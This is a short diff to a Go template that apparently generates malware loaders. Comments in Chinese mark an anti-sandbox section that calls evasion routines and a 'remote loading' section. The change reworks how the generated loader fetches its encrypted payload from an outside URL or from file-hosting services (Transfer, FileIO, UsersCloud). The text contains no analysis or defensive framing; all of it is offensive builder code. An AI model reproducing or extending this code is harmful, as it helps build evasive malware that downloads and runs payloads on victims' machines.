@@ -28,7 +28,7 @@ func init() {
     {{end}}
 
     {{/* 反沙箱 */}}
-	{{if .SandBox}}
+    {{if .SandBox}}
         {{range .SandBox.Methods}}
             {{.}}()
 	    {{end}}
@@ -84,8 +84,14 @@ func main() {
 
     {{/* 远程加载 */}}
     {{if .Remote}}
-        {{.Remote.UrlName}} := "{{.Remote.Url}}"
-        {{.CipherText}}, _ := {{.Remote.Method}}({{.Remote.UrlName}})
+        {{/* Transfer, FileIO 远程加载 */}}
+        {{if .Remote.Method}}
+            {{.CipherText}} := {{.Remote.Method}}("{{.Remote.Url}}")
+
+        {{/* UsersCloud 远程加载 */}}
+        {{else if .Remote.UCFileCode}}
+             {{.CipherText}} := {{.Remote.UCMethod}}("{{.Remote.UCFileCode}}")
+        {{end}}
     {{end}}
 
     {{/* 动态数据 */}}
